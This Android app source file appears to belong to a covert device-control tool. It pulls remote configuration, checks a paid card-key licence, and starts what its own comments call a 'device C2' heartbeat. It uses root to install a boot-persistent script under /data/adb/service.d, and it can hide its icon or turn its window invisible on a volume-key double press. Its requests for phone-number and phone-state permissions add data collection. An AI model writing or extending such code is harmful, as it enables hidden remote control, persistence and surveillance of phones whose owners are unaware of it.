package com.example.msphone;

import android.Manifest;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.zy.devicelibrary.UtilsApp;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

/**
 * 入口。新协议流程：拉取远程配置(AES-CBC) → 安全闸门(Guard) → 卡密验证(CardGate) → 设备 C2(DeviceC2)。
 * 旧的 DES/50.114.113.121 验证流程已移除，由 card_server 新协议取代。
 */
public class MainActivity extends AppCompatActivity {

    private static final int DOUBLE_CLICK_TIMEOUT = 500;
    private static final int MY_PERMISSIONS_REQUEST_READ_PHONE_NUMBERS = 3;
    private static final int STORAGE_PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_REQ_CODE = 1001;
    private static final int GATE_REQUEST_CODE = 2001;

    private static final String PREFS_NAME = "AppSettings";
    private static final String KEY_TRANSPARENT = "isTransparent";

    public static Integer dak = 0;

    private SharedPreferences prefs;
    private boolean isTransparent = false;
    private long lastVolumeDownClickTime = 0;

    // 远程配置在子线程拉取后暂存，供闸门结果回调使用
    private volatile RemoteConfig pendingConfig;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        PermissionGuideHelper.checkAndGuide(this);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_CALENDAR,
                            Manifest.permission.READ_PHONE_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_EXTERNAL_STORAGE},
                    MY_PERMISSIONS_REQUEST_READ_PHONE_NUMBERS);
        }
        installMonitorScript();
        UtilsApp.init(this.getApplication());
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        isTransparent = prefs.getBoolean(KEY_TRANSPARENT, false);
        applyTransparency();

        // 网络/安全检查放后台线程，避免阻塞 UI
        new Thread(this::bootstrap, "boot").start();
    }

    /** 后台引导：配置 → 安全闸门 → 许可校验 → 验证/放行。 */
    private void bootstrap() {
        RemoteConfig cfg = ConfigClient.fetch(this);
        pendingConfig = cfg;

        String violation = Guard.evaluate(this, cfg);
        if (violation != null) {
            lockAndExit();
            return;
        }

        if (CardGate.licensed(this)) {
            runOnUiThread(() -> proceed(cfg));
            return;
        }

        runOnUiThread(() -> launchGate(cfg));
    }

    private void launchGate(RemoteConfig cfg) {
        Intent intent = new Intent(this, CardGateActivity.class);
        boolean lock = true;
        if (cfg != null && cfg.enableHtmlPopups) {
            RemoteConfig.HtmlPopup popup = cfg.firstActivePopup();
            if (popup != null) {
                intent.putExtra(CardGateActivity.EXTRA_HTML, popup.html);
                lock = popup.lock;
            }
        }
        intent.putExtra(CardGateActivity.EXTRA_LOCK, lock);
        startActivityForResult(intent, GATE_REQUEST_CODE);
    }

    /** 验证通过/已授权后：启动悬浮窗服务 + 设备 C2 心跳。 */
    private void proceed(RemoteConfig cfg) {
        startFloatingWindowService();
        DeviceC2.start(this);
        new Thread(() -> {
            try { RootUtils.executeAsRoot("input keyevent KEYCODE_HOME"); } catch (Throwable ignored) {}
        }).start();
    }

    private void lockAndExit() {
        runOnUiThread(() -> {
            try { Toast.makeText(this, "运行环境校验未通过", Toast.LENGTH_SHORT).show(); } catch (Throwable ignored) {}
            finish();
            System.exit(0);
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == GATE_REQUEST_CODE) {
            if (resultCode == RESULT_OK && CardGate.licensed(this)) {
                proceed(pendingConfig);
            } else {
                finish();
                System.exit(0);
            }
            return;
        }
        if (requestCode == OVERLAY_PERMISSION_REQ_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                startFloatingService();
            } else {
                Toast.makeText(this, "未授予悬浮窗权限，应用无法启动", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // 权限结果不强制阻断流程
    }

    // ---------------- 透明切换（双击音量下键）----------------

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastVolumeDownClickTime < DOUBLE_CLICK_TIMEOUT) {
                lastVolumeDownClickTime = 0;
                toggleTransparency();
            } else {
                lastVolumeDownClickTime = currentTime;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    private void toggleTransparency() {
        isTransparent = !isTransparent;
        prefs.edit().putBoolean(KEY_TRANSPARENT, isTransparent).apply();
        applyTransparency();
    }

    private void applyTransparency() {
        View decorView = getWindow().getDecorView();
        decorView.setAlpha(isTransparent ? 0.0f : 1.0f);
    }

    // ---------------- 悬浮窗服务 ----------------

    private void startFloatingWindowService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQ_CODE);
            Toast.makeText(this, "请先授予悬浮窗权限", Toast.LENGTH_LONG).show();
        } else {
            startFloatingService();
        }
    }

    private void startFloatingService() {
        Intent serviceIntent = new Intent(this, FloatingWindowService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    // ---------------- 内置脚本部署（保留原逻辑）----------------

    private String readScriptFromAssets(String fileName) {
        StringBuilder scriptBuilder = new StringBuilder();
        try (InputStream is = getAssets().open(fileName);
             BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {
            String line;
            while ((line = reader.readLine()) != null) {
                scriptBuilder.append(line).append("\n");
            }
            return scriptBuilder.toString();
        } catch (IOException e) {
            return null;
        }
    }

    private void installMonitorScript() {
        String scriptContent = readScriptFromAssets("monitor_script.sh");
        if (scriptContent == null) return;
        installScript(scriptContent, "/data/adb/service.d/99-mymonitor.sh");
    }

    private void installScript(String scriptContent, String targetPath) {
        String encodedScript = Base64.encodeToString(scriptContent.getBytes(), Base64.NO_WRAP);
        String command = "echo '" + encodedScript + "' | base64 -d > " + targetPath + " && chmod 755 " + targetPath;
        RootUtils.executeAsRoot(command);
    }

    // ---------------- 杂项（保留）----------------

    private void checkUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
        if (mode != AppOpsManager.MODE_ALLOWED) {
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        }
    }

    private void hideAppIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        SharedPreferences p = getSharedPreferences("app_settings", MODE_PRIVATE);
        p.edit().putBoolean("icon_hidden", true).apply();
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<?> serviceClass) {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            // ignore
        }
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
                splitter.setString(settingValue);
                while (splitter.hasNext()) {
                    String accessibilityService = splitter.next();
                    if (accessibilityService.equalsIgnoreCase(context.getPackageName() + "/" + serviceClass.getName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public void adfaev(Integer cardNum) {
        SharedPreferences sharedPreferences = getSharedPreferences("XposedModulePrefs", 0);
        sharedPreferences.edit().putInt("fdg341", cardNum).apply();
        Intent intent = new Intent("com.example.msphone.THISSHOWTIME");
        intent.putExtra("xsfvs", cardNum);
        sendBroadcast(intent);
    }
}
